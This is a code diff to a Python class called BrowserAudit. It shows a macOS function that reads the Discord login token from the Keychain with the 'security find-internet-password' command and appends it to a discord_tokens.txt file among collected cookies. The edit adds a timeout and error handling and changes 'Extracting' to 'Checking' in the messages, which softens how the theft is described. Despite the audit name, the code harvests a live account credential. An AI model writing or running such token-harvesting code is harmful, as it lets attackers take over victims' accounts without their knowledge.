@@ -238,23 +238,28 @@ class BrowserAudit:
         if self.os_type != 'darwin':
             return
 
-        print(f"{self.COLORS['CYAN']}[*] Extracting Discord tokens from Keychain...{self.COLORS['RESET']}")
+        print(f"{self.COLORS['CYAN']}[*] Checking Discord tokens in Keychain...{self.COLORS['RESET']}")
         self.log("INFO", "Starting Keychain token extraction")
 
         try:
             result = subprocess.run(
                 ['security', 'find-internet-password', '-s', 'discord.com', '-w'],
-                capture_output=True, text=True
+                capture_output=True, text=True, timeout=5
             )
             if result.returncode == 0 and result.stdout.strip():
                 token = result.stdout.strip()
                 with open(self.cookies_dir / "discord_tokens.txt", 'a') as f:
                     f.write(f"[Discord-Keychain] {token}\n")
-                print(f"{self.COLORS['GREEN']}[OK] Keychain token extracted{self.COLORS['RESET']}\n")
+                print(f"{self.COLORS['GREEN']}[OK] Keychain token found{self.COLORS['RESET']}\n")
                 self.log("INFO", "Discord Keychain token extracted")
                 return True
-        except:
-            pass
+            else:
+                print(f"{self.COLORS['YELLOW']}[!] No Discord token in Keychain (may be locked){self.COLORS['RESET']}\n")
+        except subprocess.TimeoutExpired:
+            print(f"{self.COLORS['YELLOW']}[!] Keychain access timed out (may need password){self.COLORS['RESET']}\n")
+            self.log("WARNING", "Keychain timeout - may need password")
+        except Exception as e:
+            self.log("WARNING", f"Keychain extraction failed: {e}")
 
         return False
 
